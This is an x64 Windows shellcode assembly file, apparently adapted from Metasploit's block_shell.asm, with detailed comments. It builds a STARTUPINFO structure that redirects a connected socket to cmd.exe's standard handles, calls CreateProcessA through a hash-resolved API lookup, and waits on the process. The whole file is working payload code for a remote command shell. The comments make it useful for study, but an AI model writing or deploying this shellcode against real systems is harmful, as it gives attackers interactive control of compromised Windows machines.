; Inputs:
;   - RBP: The address of 'api_call'
;   - RDI: A socket
; Output: None
; Clobbers: RAX, RCX, RDX, RSI, R8, R9, R10, RSP
;
; Resources
;   - https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_shell.asm

shell:
    mov r8, 'cmd'
    push r8                     ; An extra push for alignment
    push r8                     ; Push our command line: 'cmd', 0
    mov rdx, rsp                ; Save a pointer to the command line, that will be used as the parameter (lpCommandLine) for the CreateProcessA
    push rdi                    ; Our socket becomes the shell's hStdError
    push rdi                    ; Our socket becomes the shell's hStdOutput
    push rdi                    ; Our socket becomes the shell's hStdInput
    xor r8, r8                  ; Clear r8 for all the NULL's we need to push
    push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
    pop rcx                     ; Set RCX for the loop
push_loop:
    push r8                     ; Push a null qword
    loop push_loop              ; Keep looping until we have pushed enough nulls
    mov word [rsp+84], 0x0101   ; Set the STARTUPINFO structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO structure
    mov byte [rax], 104         ; Set the size of the STARTUPINFO structure
    mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION structure
    ; CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPROCESS_INFORMATION lpProcessInformation)
    push rsi                    ; lpProcessInformation
    push rax                    ; lpStartupInfo
    push r8                     ; lpCurrentDirectory = NULL
    push r8                     ; lpEnvironment = NULL
    push r8                     ; dwCreationFlags = 0
    inc r8
    push r8                     ; bInheritHandles = TRUE (1)
    dec r8
    mov r9, r8                  ; lpThreadAttributes = NULL
                                ; lpProcessAttributes = NULL
                                ; lpCommandLine = 'cmd', 0
    mov rcx, r8                 ; lpApplicationName = NULL
    mov r10d, 0x863FCC79        ; The hash of kernel32.dll!CreateProcessA that has been generated with `python3 hash.py kernel32.dll CreateProcessA`
    call rbp                    ; Call CreateProcessA(0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi)
    ; WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
    xor rdx, rdx
    dec rdx                     ; dwMilliseconds = -1 (INFINITE)
    mov ecx, dword [rsi]        ; hHandle = pi.hProcess
    mov r10d, 0x601D8708        ; The hash of kernel32.dll!WaitForSingleObject that has been generated with `python3 hash.py kerenel32.dll WaitForSingleObject`
    call rbp                    ; Call WaitForSingleObject(pi.hProcess, INFINITE)
